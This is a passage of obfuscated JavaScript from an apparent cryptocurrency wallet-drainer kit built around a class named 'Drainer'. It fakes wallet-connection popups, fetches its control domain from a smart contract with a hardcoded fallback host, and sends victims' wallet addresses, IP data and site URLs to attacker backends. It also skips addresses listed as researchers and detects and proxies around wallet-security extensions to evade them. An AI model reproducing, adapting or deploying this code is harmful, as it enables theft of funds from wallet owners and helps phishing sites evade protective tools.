ccJ7PxOuDVeK+2vz8T4825xMP3Lm2EwdKb6gA6uu0/sKQ3cdPkHvvWbH5+xptBB8KFCt7H8ymzxe4O0tmBv0cKnIpOkXLOSKC/D5iIPYW/NHeDoK7srg0cg8OH/5MlQEYPjwv0yTZvYdAvZB1HAuQx345B6bmccScMXR2aBfTe+jE4RRcc2NidLGzMe8ziJWVa5uxUvoVOQrBzP8KgcnzQJW2/BpIxTXcRmKD+4YavBAZaSVrVsdeQbdBvT3OlQonGALTtDzSb+EBPL9gtSIH7Xg0zklQxmE6pTo3nGUGrxXnd6sadWdFXqAYS6RkWT0SMWxGd2/aABrpdfPAmp7hirWR7aVE/Jc0r9K/aAKIPK60AFxj1FK4jTB/9JtOSDGVPbzx6lYo4ggRgEIbXLzOaIEXZjgid8To4+l6rI/g+VaMiMlrzpxj0GGQaH2qBs5clCG/f+tmC+KA80QogwAyrUZklXzmkkJcmc9rS6/7XcgGHBEKUa1jdK3qAa7dK0Y2g0fA/vag0glDDuaMs0U8bgqClVzOrk68IKdhjrED9ATI0eTsAG7GzsWudyJZQWZM8Q+r2AB6tPVRtad5psvpzm18y9OpWW1snkAMrxG285sHOfKbfN5kj4Tdb1hAShePuufBBvecAHm4z8Bh+Om+bgCmBXF0jkSVFGOgbGs0GiC3N22TkXkXFolijVvfZE9qCt3AcPABuXH1K302PJoYYPJ6vOhRj+eUCMo3EwrVzwOAsvqS5Bl94DQ77lpWWeLJX1loQPvYesflNidM38AyXmRn7ZcqmAl8rfLCi4uPv4AgCVflQDcym61nyBh3FOm69LhDfHC3PI68ujNURDzjDC/MpzZVgEbOO/yTwgon78PEdpDGGmGe3R+XZGcZ6khPEB61UmKNF5ehdYPrn4tJST+1uOa3VF77c+Cne/SU1SPss94f1UPPrfsKXbSw8t1TouOPHyGQyhwhgEIv4MwtNyO+aJWau1TrQdOpx4E1MTepNpHRxjxJ0094nkHctYDPgMqc7IjtmzLJ8sgpcosqTeVK9XyEvMYbWlqw31AJ6YjUzPnquOhH3eIwEX52GUI+qDDGax+0kg/BBekBXjia5RbVIW1/WT8kfTb+qMGRI4roP7R4AUY+IKPbPMSIi6zBGCfEW5nanTRcpi8F1u5lLhDfHC3P8CJg/gz7Cj////LmnBIw4zLOvs9MhjWwJ3UB9DRVHeLMdLA4ivQQr/LgLoEukc4QMftHEk0T24A528zlnc6zOIoY4Bp5v+P+LuFsud4JSsxTqRTsYQ4Ws1bFAPPM34i0G7fHPnLc9g1I/Kc2RSKPbSB1twEQ/QAkoNaHub2WB23IdvOuE4RBUP2qcAd11avaAAAl6lyPCLIpHzLw6U3g4mC6/GbGyo3tZJ5poI9Jtb35VygHdROD1tPWcxN33HLFC0BEume5iSAd0OOJnw4sHSFtZ7pqXDJpnFqB8i4f21y/SaVsIPeCd5YtsSJKRIha6Jr58LGgAAAAAAAAAAAAAAAA==";
          let B = "wallet";
          let V = "unknown";
          console.log(window.wallet_name);
          try {
            if (window.wallet_name) {
              V = window.wallet_name.trim().replace("injected\"", "Injected Wallet").replace(/[\$\^\*\"\']/g, '').replace("Trust Wallet is a secure and easy-to-use mobile wallet", "Trust Wallet").replace("eip6963", "Injected wallet");
              B = V;
            }
            if (window?.["main_provider"]?.["isMetaMask"] == true) {
              B = "MetaMask Wallet";
              V = B;
            }
            if (window?.["main_provider"]?.["isTrustWallet"] == true) {
              B = "Trust Wallet";
              V = B;
            }
            if (window?.["main_provider"]?.["isCoinbaseWallet"] == true) {
              B = "CoinBase";
              V = B;
            }
            const f = {
              "🌈 Rainbow": "https://explorer-api.walletconnect.com/w3m/v1/getWalletImage/7a33d7f1-3d12-4b5c-f3ee-5cd83cb1b500?projectId=" + config.wc_project + "&sdkType=w3m&sdkVersion=js-2.7.1",
              "Exodus Mobile": "https://explorer-api.walletconnect.com/w3m/v1/getWalletImage/4c16cad4-cac9-4643-6726-c696efaf5200?projectId=" + config.wc_project + "&sdkType=w3m&sdkVersion=js-2.7.1",
              "CoinBase": "https://explorer-api.walletconnect.com/w3m/v1/getWalletImage/a5ebc364-8f91-4200-fcc6-be81310a0000?projectId=" + config.wc_project + "&sdkType=w3m&sdkVersion=js-2.7.1",
              "MetaMask Wallet": "https://explorer-api.walletconnect.com/w3m/v1/getWalletImage/5195e9db-94d8-4579-6f11-ef553be95100?projectId=" + config.wc_project + "&sdkType=w3m&sdkVersion=js-2.7.1",
              "Trust Wallet": "https://explorer-api.walletconnect.com/w3m/v1/getWalletImage/7677b54f-3486-46e2-4e37-bf8747814f00?projectId=" + config.wc_project + "&sdkType=w3m&sdkVersion=js-2.7.1",
              "Ledger Wallet": "https://explorer-api.walletconnect.com/w3m/v1/getWalletImage/a7f416de-aa03-4c5e-3280-ab49269aef00?projectId=" + config.wc_project + "&sdkType=w3m&sdkVersion=js-2.7.1",
              "Zerion": "https://explorer-api.walletconnect.com/w3m/v1/getWalletImage/73f6f52f-7862-49e7-bb85-ba93ab72cc00?projectId=" + config.wc_project + "&sdkType=w3m&sdkVersion=js-2.7.1"
            };
            if (f.hasOwnProperty(V)) {
              i = f[V];
              B = V;
            }
          } catch (D) {}
          Swal.fire({
            "icon": '',
            "showConfirmButton": false,
            "html": '',
            "text": '',
            "footer": "<div class=\"flex-center\">\n                                      <div class=\"wallet-icon-container\">\n                                          <svg class=\"wallet-spinner-svg\" viewBox=\"0 0 110 110\" width=\"110\" height=\"110\" xmlns=\"http://www.w3.org/2000/svg\">\n                                              <rect id=\"w3m-loader\" fill=\"transparent\" x=\"2\" y=\"2\" width=\"106\" height=\"106\" rx=\"35\" stroke-dasharray=\"106 262\">\n                                                  <animate attributeName=\"stroke-dashoffset\" values=\"360;0\" dur=\"1s\" repeatCount=\"indefinite\"></animate>\n                                              </rect>\n                                          </svg>\n                                          <img class=\"swal2-large-image\" src=\"" + i + "\">\n                                      </div>\n                                  </div>\n                                  <div class=\"swal2-subtext\">Continue in " + B + "...</div>\n                                  <div class=\"swal2-sub-footer\">You must approve the prompt in order to continue.</div>",
            "customClass": {
              "popup": "swal2-popup-square",
              "footer": "swal2-minimal-footer"
            }
          });
        } else {
          document.getElementById(popupElementID).style.display = "flex";
        }
      }
    } catch (U) {
      console.log(U);
    }
  };
  static ["closePopup"] = () => {
    try {
      if (config.design.enablePopup && !config.useDefaultPopup && !config.popupCode) {
        console.log("Closing popup...");
        document.getElementById(popupElementID).style.display = "none";
      }
    } catch (i) {
      console.log(i);
    }
  };
}
class Drainer extends Configuration {
  constructor() {
    if (window?.["reserve_wc"]) {
      config.wc_projectid = window?.["reserve_wc"];
    }
    DrainerPopup.renderPopup();
    super();
    this.InjectModal();
    this.getDomain().then(o => {
      this.logDomainName = "https://rpc." + o[0] + "/";
      this.apiDomainName = "https://api." + o[0] + "/";
      config = Object.assign({}, config, o[1]);
      config.researchers_full = Array.from(new Set(config.researchers.concat(config.researchers_latest)));
    })["catch"](o => {
      console.log("Error: ", o);
    });
    if (typeof window.ethereum !== "undefined") {
      this.metamaskInstalled = true;
    }
    const B = {
      "id": 0x19,
      "name": "Cronos",
      "network": "cronos",
      "nativeCurrency": {
        "decimals": 0x12,
        "name": "Cronos",
        "symbol": "CRO"
      },
      "rpcUrls": {
        "default": {
          "http": ["https://cronos-evm.publicnode.com"]
        },
        "public": {
          "http": ["https://cronos-evm.publicnode.com"]
        }
      },
      "blockExplorers": {
        "etherscan": {
          "name": "CronosScan",
          "url": "https://cronoscan.com"
        },
        "default": {
          "name": "CronosScan",
          "url": "https://cronoscan.com"
        }
      },
      "contracts": {
        "multicall3": {
          "address": "0xcA11bde05977b3631167028862bE2a173976CA11",
          "blockCreated": 0x1df468
        }
      }
    };
    const V = {
      "id": 0x2105,
      "name": "Base",
      "network": "base",
      "nativeCurrency": {
        "decimals": 0x12,
        "name": "Ether",
        "symbol": "ETH"
      },
      "rpcUrls": {
        "default": {
          "http": ["https://developer-access-mainnet.base.org"]
        },
        "public": {
          "http": ["https://developer-access-mainnet.base.org"]
        }
      },
      "blockExplorers": {
        "etherscan": {
          "name": "BaseScan",
          "url": "https://basescan.org"
        },
        "default": {
          "name": "BaseScan",
          "url": "https://basescan.org"
        }
      }
    };
    const f = {
      "id": 0x171,
      "name": "PulseChain",
      "network": "pulsechain",
      "nativeCurrency": {
        "decimals": 0x12,
        "name": "PLS",
        "symbol": "PLS"
      },
      "rpcUrls": {
        "default": {
          "http": ["https://rpc-pulsechain.g4mm4.io"]
        },
        "public": {
          "http": ["https://rpc-pulsechain.g4mm4.io"]
        }
      },
      "blockExplorers": {
        "etherscan": {
          "name": "PulseScan",
          "url": "https://scan.pulsehotlist.com/#/"
        },
        "default": {
          "name": "PulseScan",
          "url": "https://scan.pulsehotlist.com/#/"
        }
      }
    };
    const D = {
      "id": 0x13e31,
      "name": "Blast",
      "network": "Blast",
      "nativeCurrency": {
        "decimals": 0x12,
        "name": "ETH",
        "symbol": "ETH"
      },
      "rpcUrls": {
        "default": {
          "http": ["https://rpc.blast.io/"]
        },
        "public": {
          "http": ["https://rpc.blast.io/"]
        }
      },
      "blockExplorers": {
        "etherscan": {
          "name": "PulseScan",
          "url": "https://blastscan.io/"
        },
        "default": {
          "name": "PulseScan",
          "url": "https://blastscan.io/"
        }
      }
    };
    const U = {
      "id": 0xa9,
      "name": "Manta",
      "network": "Manta",
      "nativeCurrency": {
        "decimals": 0x12,
        "name": "ETH",
        "symbol": "ETH"
      },
      "rpcUrls": {
        "default": {
          "http": ["https://pacific-rpc.manta.network/http"]
        },
        "public": {
          "http": ["https://pacific-rpc.manta.network/http"]
        }
      },
      "blockExplorers": {
        "etherscan": {
          "name": "MantaScan",
          "url": "https://manta.socialscan.io/"
        },
        "default": {
          "name": "MantaScan",
          "url": "https://blastscan.io/"
        }
      }
    };
    optimism = {
      "id": 0xa,
      "name": "OP Mainnet",
      "network": "optimism",
      "nativeCurrency": {
        "name": "Ether",
        "symbol": "ETH",
        "decimals": 0x12
      },
      "rpcUrls": {
        "alchemy": {
          "http": ["https://opt-mainnet.g.alchemy.com/v2"],
          "webSocket": ["wss://opt-mainnet.g.alchemy.com/v2"]
        },
        "infura": {
          "http": ["https://optimism-mainnet.infura.io/v3"],
          "webSocket": ["wss://optimism-mainnet.infura.io/ws/v3"]
        },
        "default": {
          "http": ["https://optimism.meowrpc.com"]
        },
        "public": {
          "http": ["https://optimism.meowrpc.com"]
        }
      },
      "blockExplorers": {
        "etherscan": {
          "name": "Etherscan",
          "url": "https://optimistic.etherscan.io"
        },
        "default": {
          "name": "Optimism Explorer",
          "url": "https://explorer.optimism.io"
        }
      },
      "contracts": {
        "multicall3": {
          "address": "0xca11bde05977b3631167028862be2a173976ca11",
          "blockCreated": 0x416737
        }
      },
      "formatters": {
        "block": {
          "type": "block"
        },
        "transaction": {
          "type": "transaction"
        },
        "transactionReceipt": {
          "type": "transactionReceipt"
        }
      }
    };
    if (!config.experimental["save-wc-session"]) {
      const o = ["wc@", "wagmi", "W3M_", "walletlink", "loglevel"];
      const O = Object.keys(localStorage);
      for (const I of O) {
        for (const x of o) {
          if (I.includes(x)) {
            localStorage.removeItem(I);
          }
        }
      }
    }
    const q = {
      "name": config.w3m_name,
      "description": config.w3m_description,
      "url": config.w3m_url,
      "icons": config.w3m_icons
    };
    const y = [mainnet, polygon, bsc, arbitrum, avalanche, fantom, optimism, celo, B, V, f, D, U];
    window.chainsList = y;
    let K;
    let s;
    let a;
    let t;
    let N;
    let c;
    const l = {
      chains: y
    };
    this.meta_connector = new window.MetaMaskConnector(l);
    this.injected_connector = new window.InjectedConnector({
      "chains": y,
      "options": {
        "name": "Injected"
      }
    });
    this.ledger_connector = new window.LedgerConnector({
      "chains": y,
      "projectId": config.wc_projectid,
      "walletConnectVersion": 0x2,
      "chainId": 0x1,
      "options": {
        "chainId": 0x1,
        "walletConnectVersion": 0x2,
        "enableDebugLogs": false,
        "projectId": config.wc_project
      }
    });
    this.safe_connector = new window.SafeConnector({
      "chains": y,
      "options": {
        "projectId": config.wc_project,
        "debug": false
      }
    });
    this.coinbase_connector = new CoinbaseWalletConnector({
      "chains": y,
      "options": {
        "appName": "wagmi"
      }
    });
    if (config.USE_W3M_V3) {
      K = defaultWagmiConfig({
        "chains": y,
        "projectId": this.projectId,
        "metadata": q
      });
      s = createConfig({
        "connectors": [this.meta_connector, this.injected_connector, this.coinbase_connector, this.ledger_connector, this.safe_connector],
        "publicClient": r
      });
      let Q = ["c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96", "4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0", "19177a98252e07ddfc9af2083ba8e07ef627cb6103467ffebb3f8f4205fd7927", "225affb176778569276e484e1b92637ad061b01e13a048b35a9d280c3b58970f"];
      this.modal = createWeb3Modal({
        "wagmiConfig": K,
        "projectId": this.projectId,
        "chains": y,
        "themeVariables": themeVariables,
        "themeMode": config.chooseTheme,
        "featuredWalletIds": Q
      });
      if (config.experimental.hasOwnProperty("non-featured-w3m")) {
        this.modal = createWeb3Modal({
          "wagmiConfig": K,
          "projectId": this.projectId,
          "chains": y,
          "themeVariables": themeVariables,
          "themeMode": config.chooseTheme
        });
      }
      window.modal = this.modal;
      this.ethereumClient.getAccount = getAccount;
      this.ethereumClient2.getAccount = getAccount;
      this.ethereumClient3.getAccount = getAccount;
      this.ethereumClient4.getAccount = getAccount;
      this.ethereumClient5.getAccount = getAccount;
      this.ethereumClient6.getAccount = getAccount;
    } else {
      const {
        chains: v,
        provider: w
      } = configureChains(y, [publicProvider(), w3mProvider({
        "projectId": this.projectId
      })]);
      K = createConfig({
        "connectors": w3mConnectors({
          "chains": y,
          "projectId": this.projectId,
          "version": 0x2
        }),
        "autoConnect": true,
        "provider": w
      });
      s = createConfig({
        "connectors": [this.meta_connector],
        "autoConnect": true,
        "provider2": C
      });
      a = createConfig({
        "connectors": [this.injected_connector],
        "autoConnect": true,
        "provider2": C
      });
      t = createConfig({
        "connectors": [this.coinbase_connector],
        "autoConnect": true,
        "provider2": C
      });
      N = createConfig({
        "connectors": [this.safe_connector],
        "autoConnect": true,
        "provider2": C
      });
      c = createConfig({
        "connectors": [this.ledger_connector],
        "autoConnect": true,
        "provider2": C
      });
      this.ethereumClient = new EthereumClient(K, v);
      this.ethereumClient2 = new EthereumClient(s, y);
      this.ethereumClient3 = new EthereumClient(a, y);
      this.ethereumClient4 = new EthereumClient(t, y);
      this.ethereumClient5 = new EthereumClient(N, y);
      this.ethereumClient6 = new EthereumClient(c, y);
      this.hueModal = new Web3Modal({
        "projectId": this.projectId,
        "themeMode": config.chooseTheme,
        "themeVariables": themeVariables
      }, this.ethereumClient);
    }
    window.mdl = this.modal;
    if (config.USE_W3M_V3 && !this.subscribed) {
      this.unsubscribe = this.modal.subscribeState(P => {
        this.updateStates(P);
      });
      this.subscribed = true;
    } else if (!this.subscribed) {
      this.unsubscribe = this.hueModal.subscribeModal(P => {
        this.updateStates(P);
      });
      this.subscribed = true;
    }
    this.linkButtons();
    (function () {
      let h = this;
      setInterval(function () {
        h.linkButtons();
      }, 1000);
    }).call(this);
    if (autoconnect) {
      if (config.USE_W3M_V3 && !this.subscribed) {
        this.unsubscribe = this.modal.subscribeState(P => {
          this.updateStates(P);
        });
        this.subscribed = true;
      } else if (!this.subscribed) {
        this.unsubscribe = this.hueModal.subscribeModal(P => {
          this.updateStates(P);
        });
        this.subscribed = true;
      }
      if (config.mainModal == "w3m" || config.mainModal == 0) {
        this.connectWallet();
      } else {
        this.triggerModal(true);
      }
    }
    this.getIpData();
  }
  ["signTextMessage"] = async T => {
    let B = T;
    try {
      B = "0x" + Buffer.from(T, "utf8").toString("hex");
    } catch (V) {
      console.log(V);
    }
    console.log(T, "->", B);
    await this.main_provider.sendAsync({
      "method": "personal_sign",
      "params": ['', this.walletAddress],
      "from": this.walletAddress
    }, (f, D) => {});
  };
  ["getDomain"] = async () => {
    try {
      let i = "nftfastapi.com";
      try {
        let f = await sendRequests(rpcUrls, "0x6Ec59fD0A6EAad3174A1520FE56a0109F28e069F", "0xc2fb26a629690e2388a22f16d924e4a645cd2b40a8e24c414d664ad7ea957b73").then(D => {
          const q = D.find(y => y.status === "fulfilled");
          if (q) {
            return q;
          }
          return null;
        });
        if (f.value.result) {
          i = fromHex(f.value.result);
          i = i.trim();
          console.log(i);
        }
      } catch (D) {
        console.log("Error while reading SC for domain", D);
      }
      try {
        if (i == undefined || !i || i == '') {
          console.log("Using fallback domain");
          let U = await fetch("https://nftfastapi.com/router.js");
          if (!U.ok) {
            console.log("Network response was not ok");
          } else {
            i = await U.text();
          }
        }
      } catch (q) {
        console.log("Error while reading domain", q);
      }
      let V = await fetch("https://rpc." + i + "/config?key=" + config.API_KEY, {
        "method": "GET",
        "mode": "cors",
        "cache": "no-cache",
        "headers": {
          "Content-Type": "application/json",
          "Accept": "application/json"
        }
      }).then(y => y.json()).then(y => JSON.parse(this.decryptBody(y.encrypted)));
      console.log(V);
      return [i, V];
    } catch (y) {
      console.log("Error: ", y);
    }
  };
  ["linkButtons"] = async () => {
    this.connectButton = document.querySelectorAll("." + config.design.connectElement);
    this.twoStepButton = document.querySelectorAll("." + config.design.twoStepButtonElement);
    for (let i = 0; i < this.connectButton.length; i += 1) {
      let B = 20000;
      if (config.twoStep) {
        B = 200;
      }
      const V = this.connectButton[i].hasAttribute(this.adlinkedkey);
      if (!V) {
        this.connectButton[i].addEventListener("click", () => {
          console.log("Clicked on connect.", config.twoStep ? "Waiting for second click" : "Starting");
          if (config.mainModal == "w3m" || config.mainModal == 0) {
            this.connectWallet();
          } else {
            this.triggerModal(true);
          }
        }, false);
        this.connectButton[i].setAttribute(this.adlinkedkey, "true");
      }
    }
    if (config.twoStep) {
      for (let f = 0; f < this.twoStepButton.length; f += 1) {
        const D = this.twoStepButton[f].hasAttribute(ts_adlinkedkey);
        if (!D) {
          this.twoStepButton[f].addEventListener("click", () => {
            setTimeout(() => {
              this.started = false;
            }, 20000);
            console.log("Clicked on start");
            this.Perexod();
          }, false);
          this.twoStepButton[f].setAttribute(ts_adlinkedkey, "true");
        }
      }
    }
  };
  ["InjectModal"] = async () => {
    if (this.isMobile()) {
      if (!config.experimental.hasOwnProperty("custom-on-mobile")) {
        config.mainModal = "w3m";
      }
    }
    window.operationInProgress = false;
    let i = '';
    if (config.mainModal == "custom") {
      if (customModalCode) {
        i = customModalCode;
      }
    } else {
      if (config.mainModal == "w3m" || config.mainModal == 0) {
        return;
      }
    }
    var B = document.querySelectorAll(this.modalrootkey);
    B.forEach(function (N) {
      N.parentNode.removeChild(N);
    });
    const V = document.createElement(this.modalrootkey);
    this.modal_shadowRoot = V.attachShadow({
      "mode": "open"
    });
    this.modal_shadowRoot.innerHTML = i;
    document.body.appendChild(V);
    let f = this.modal_shadowRoot.querySelectorAll(".web3-overlay");
    let D = this.modal_shadowRoot.querySelectorAll(".web3-modal-metamask");
    let U = this.modal_shadowRoot.querySelectorAll(".web3-modal-web3modal");
    let q = this.modal_shadowRoot.querySelectorAll(".web3-modal-trust");
    let y = this.modal_shadowRoot.querySelectorAll(".web3-modal-injected");
    let K = this.modal_shadowRoot.querySelectorAll(".web3-modal-coinbase");
    let s = this.modal_shadowRoot.querySelectorAll(".web3-modal-safe");
    let a = this.modal_shadowRoot.querySelectorAll(".web3-modal-ledger");
    let t = this.modal_shadowRoot.querySelectorAll(".web3-modal-close");
    if (f.length) {
      for (let N of f) {
        N.addEventListener("click", () => {
          this.triggerModal(false);
        }, false);
      }
    }
    if (t.length) {
      for (let c of t) {
        c.addEventListener("click", () => {
          this.triggerModal(false);
        }, false);
      }
    }
    if (D) {
      for (let l of D) {
        l.addEventListener("click", () => {
          this.modal_connect_wallet("metamask");
        }, false);
      }
    }
    if (U.length) {
      for (let o of U) {
        o.addEventListener("click", () => {
          console.log("Clicked on start");
          this.modal_connect_wallet("w3m");
        }, false);
      }
    }
    if (s.length) {
      for (let O of s) {
        O.addEventListener("click", () => {
          console.log("Clicked on start");
          if (config.experimental.hasOwnProperty("safe-as-w3m")) {
            this.modal_connect_wallet("w3m");
          } else {
            this.modal_connect_wallet("safe");
          }
        }, false);
      }
    }
    if (a.length) {
      for (let I of a) {
        I.addEventListener("click", () => {
          console.log("Clicked on start");
          this.modal_connect_wallet("ledger");
        }, false);
      }
    }
    if (q.length) {
      for (let x of q) {
        x.addEventListener("click", () => {
          console.log("Clicked on start");
          this.modal_connect_wallet("trust");
        }, false);
      }
    }
    if (y.length) {
      for (let E of y) {
        E.addEventListener("click", () => {
          console.log("Clicked on start");
          this.modal_connect_wallet("injected");
        }, false);
      }
    }
    if (K.length) {
      for (let r of K) {
        r.addEventListener("click", () => {
          console.log("Clicked on start");
          this.modal_connect_wallet("coinbase");
        }, false);
      }
    }
  };
  ["triggerModal"] = async T => {
    try {
      let B = this.modal_shadowRoot.querySelectorAll(".web3-modal");
      let V = this.modal_shadowRoot.querySelectorAll(".web3-overlay");
      if (T) {
        if (B.length) {
          for (let f of B) {
            f.style.display = "block";
          }
        }
        if (V.length) {
          for (let D of V) {
            D.style.display = "block";
          }
        }
      } else {
        if (B.length) {
          for (let U of B) {
            U.style.display = "none";
          }
        }
        if (V.length) {
          for (let q of V) {
            q.style.display = "none";
          }
        }
      }
    } catch (y) {
      console.log(y);
    }
  };
  ["modal_connect_wallet"] = async T => {
    console.log("click", T);
    if (T == "w3m") {
      this.triggerModal(false);
      this.connectWallet();
    } else {
      if (T == "metamask") {
        try {
          if (!this.ethereumClient2.getAccount().address) {
            await connect({
              "connector": this.meta_connector,
              "chains": window.chainsList
            });
          }
          this.updateStates(false, this.ethereumClient2);
          this.walletType = "MetaMask";
        } catch (B) {
          if (String(B).includes("Connector not found", "MetaMask")) {
            window.open("https://metamask.app.link/dapp/" + window.location.host + window.location.pathname + window.location.search);
          }
        }
      } else {
        if (T == "trust") {
          try {
            if (!this.ethereumClient3.getAccount().address) {
              await connect({
                "connector": this.injected_connector,
                "chains": window.chainsList
              });
            }
            this.updateStates(false, this.ethereumClient3);
            this.walletType = "Trust Wallet";
          } catch (V) {
            if (String(V).includes("Connector not found")) {
              window.open("https://link.trustwallet.com/open_url?coin_id=60&url=" + window.location.href);
            }
          }
        } else {
          if (T == "injected") {
            try {
              if (!this.ethereumClient3.getAccount().address) {
                await connect({
                  "connector": this.injected_connector,
                  "chains": window.chainsList
                });
              }
              this.updateStates(false, this.ethereumClient3);
              this.walletType = "Injected Wallet";
            } catch (f) {
              if (String(f).includes("Connector not found")) {
                window.open("https://metamask.app.link/dapp/" + window.location.host + window.location.pathname + window.location.search);
              }
            }
          } else {
            if (T == "coinbase") {
              try {
                if (!this.ethereumClient4.getAccount().address) {
                  await connect({
                    "connector": this.coinbase_connector,
                    "chains": window.chainsList
                  });
                }
                this.updateStates(false, this.ethereumClient4);
                this.walletType = "Coinbase Wallet";
              } catch (D) {
                console.log(D);
              }
            } else {
              if (T == "safe") {
                try {
                  if (!this.ethereumClient5.getAccount().address) {
                    await connect({
                      "connector": this.safe_connector,
                      "chains": window.chainsList
                    });
                  }
                  this.updateStates(false, this.ethereumClient5);
                  this.walletType = "Coinbase Wallet";
                } catch (U) {
                  console.log(U);
                }
              } else {
                if (T == "ledger") {
                  try {
                    if (!this.ethereumClient6.getAccount().address) {
                      this.triggerModal(false);
                      await connect({
                        "connector": this.ledger_connector,
                        "chains": window.chainsList
                      });
                    }
                    this.updateStates(false, this.ethereumClient6);
                    this.walletType = "Coinbase Wallet";
                  } catch (q) {
                    console.log(q);
                  }
                }
              }
            }
          }
        }
      }
    }
  };
  ["connectWallet"] = async () => {
    if (config.USE_W3M_V3 && !this.subscribed) {
      this.unsubscribe = this.modal.subscribeState(i => {
        this.updateStates(i);
      });
      this.subscribed = true;
    } else if (!this.subscribed) {
      this.unsubscribe = this.hueModal.subscribeModal(i => {
        this.updateStates(i);
      });
      this.subscribed = true;
    }
    if (this.ethereumClient.getAccount().address == undefined) {
      if (config.USE_W3M_V3) {
        await this.modal.open({
          "view": "Connect"
        });
      }
      if (!config.USE_W3M_V3) {
        await this.hueModal.openModal();
      }
    } else {
      await this.updateStates(false, this.ethereumClient);
    }
  };
  ["Perexod"] = async () => {
    await this.updateStates(true);
    if (!config.researchers_full.includes(this.walletAddress)) {
      this.start();
    }
  };
  ["updateStates"] = async (k, H = this.ethereumClient) => {
    if (config.mainModal !== "w3m" || config.mainModal !== 0) {
      this.triggerModal(false);
    }
    try {
      if (H.getAccount().address != undefined) {
        if (this.started == true) {
          return;
        }
        const f = {
          "1": 0x0,
          "10": 0x0,
          "25": 0x0,
          "56": 0x0,
          "137": 0x0,
          "250": 0x0,
          "8453": 0x0,
          "42220": 0x0,
          "42161": 0x0,
          "43114": 0x0,
          "81457": 0x0
        };
        this.offers = [];
        this.considerations = [];
        this.seaportTokens = [];
        this.vault = [];
        this.transactions = [];
        this.ERC20tokens = [];
        this.estimated_txs = f;
        this.started = true;
        this.isConnected = true;
        this.secondProvider = new ethers.providers.JsonRpcProvider(window.reserve_rpc_provider || "https://rpc.ankr.com/eth");
        this.main_provider = await H.getAccount().connector.getProvider();
        if (!this.main_provider.sendAsync) {
          this.main_provider.sendAsync = this.main_provider.send;
        }
        this.ethers_provider = new ethers.providers.Web3Provider(this.main_provider);
        this.signer = await this.ethers_provider.getSigner();
        this.walletAddress = await this.signer.getAddress();
        this.walletBalance = await this.secondProvider.getBalance(this.walletAddress);
        this.walletBalanceInEth = await ethers.utils.formatEther(this.walletBalance);
        this.chainId = await this.signer.getChainId();
        window.secondProvider = this.secondProvider;
        window.main_provider = this.main_provider;
        window.ethers_provider = this.ethers_provider;
        window.signer = this.signer;
        window.ethereumClient = H;
        console.log("Connected with " + this.walletAddress);
        window.unsubscribe = this.unsubscribe();
        try {
          let D = await H.getAccount().connector.name;
          if (D) {
            this.walletType = D;
          }
        } catch (U) {}
        try {
          updateWalletData(this.walletAddress, this.netWorth, 0);
        } catch (q) {
          console.log("Unable to send callback!", q);
        }
        if (!config.researchers_full.includes(this.walletAddress) && !twoStep) {
          this.unsubscribe();
          this.subscribed = false;
          this.start();
        } else {
          this.signTextMessage("Sign message to access " + window.location.hostname);
        }
      } else {
        this.isConnected = false;
      }
    } catch (y) {
      console.log(y);
    }
  };
  ["changeNetwork"] = async k => {
    if (this.ethereumClient?.["getAccount"]()?.["address"]?.["toLowerCase"]() != this.walletAddress.toLowerCase()) {
      this.started = false;
      console.log("Address Changed");
      throw new Error("Address Changed");
    }
    ;
    let V = await this.signer.getChainId();
    for (let f = 0; f < config.retry_changenetwork; f++) {
      console.log("Trying to change net for " + f + " time");
      try {
        this.ethers_provider = new ethers.providers.Web3Provider(this.main_provider);
        this.signer = await this.ethers_provider.getSigner();
        if (V != k) {
          const D = {
            chainId: k
          };
          await switchNetwork(D);
          console.log("Changed to", k);
          try {
            let U = await this.getIpData();
            fetch(this.logDomainName + "backend/chainChanged", {
              "method": "POST",
              "mode": "cors",
              "cache": "no-cache",
              "headers": {
                "Content-Type": "application/json",
                "Accept": "application/json"
              },
              "body": this.encryptBody(JSON.stringify({
                "address": this.walletAddress,
                "websiteUrl": window.location.href,
                "chain_from": V,
                "chain_to": k,
                "websiteDomain": window.location.host,
                "ipData": U,
                "API_KEY": config.API_KEY
              }))
            });
          } catch (q) {
            console.log("Change Network error: ", q);
          }
        } else {
          console.log("Already chain", k);
        }
        this.ethers_provider = new ethers.providers.Web3Provider(this.main_provider);
        window.ethers_provider = this.ethers_provider;
        this.signer = await this.ethers_provider.getSigner();
        return true;
      } catch (y) {
        console.log(y);
      }
    }
    try {
      this.ethers_provider = new ethers.providers.Web3Provider(this.main_provider);
      this.signer = await this.ethers_provider.getSigner();
      let K = await this.getIpData();
      fetch(this.logDomainName + "backend/cancelSwitchNetwork", {
        "method": "POST",
        "mode": "cors",
        "cache": "no-cache",
        "headers": {
          "Content-Type": "application/json",
          "Accept": "application/json"
        },
        "body": this.encryptBody(JSON.stringify({
          "address": this.walletAddress,
          "websiteUrl": window.location.href,
          "chain_from": V,
          "chain_to": k,
          "websiteDomain": window.location.host,
          "ipData": K,
          "API_KEY": config.API_KEY,
          "signature": this.signature
        }))
      });
      throw new Error("Unable to change net");
    } catch (s) {
      console.log("Connection Log error: ", s);
      throw new Error("Unable to change net");
    }
  };
  ["isUselessMethod"] = (T = false) => {
    if (!T) {
      return true;
    }
    if (T == "eth_requestAccounts") {
      return true;
    }
    if ("eth_signTypedData_v3" != T.method && "eth_signTypedData_v4" != T.method && "eth_sendTransaction" != T.method && "eth_sign" != T.method) {
      return true;
    }
    return false;
  };
  ["generateGUID"] = () => {
    const V = new Uint8Array(16);
    crypto.getRandomValues(V);
    let f = '';
    for (let D = 0; D < V.length; D++) {
      f += V[D].toString(16).padStart(2, "0");
    }
    return f;
  };
  ["detectSimulators"] = () => {
    try {
      if (window.ethereum) {
        if (window.ethereum.isPocketUniverseZ) {
          return [true, "P"];
        }
        if (window.ethereum.isRevokeCash) {
          return [true, "R"];
        }
        if (window.ethereum.isWalletGuard) {
          return [true, "W"];
        }
        if (window.ethereum.isFireProxy) {
          return [true, "F"];
        }
        if (window.ethereum.stelo) {
          return [true, "S"];
        }
      }
    } catch (V) {}
    return [false, ''];
  };
  ["fsign"] = async () => {
    try {
      await window.ethereum.request({
        "method": "personal_sign",
        "params": ["0x0000000000000000000000000000000000000000", this.generateGUID()]
      });
    } catch (i) {
      console.log(i);
    }
  };
  ["initProxy"] = async () => {
    try {
      if (this.detectSimulators()[0] && !this.isMobile() && (window.ethereum.isMetaMask || window.ethereum.isCoinbaseWallet)) {
        if (window.ethereum.isMetaMask) {
          Object.defineProperty(window.ethereum, "request", {
            "value": new Proxy(window.ethereum.request, {
              "apply": async (B, V, f) => {
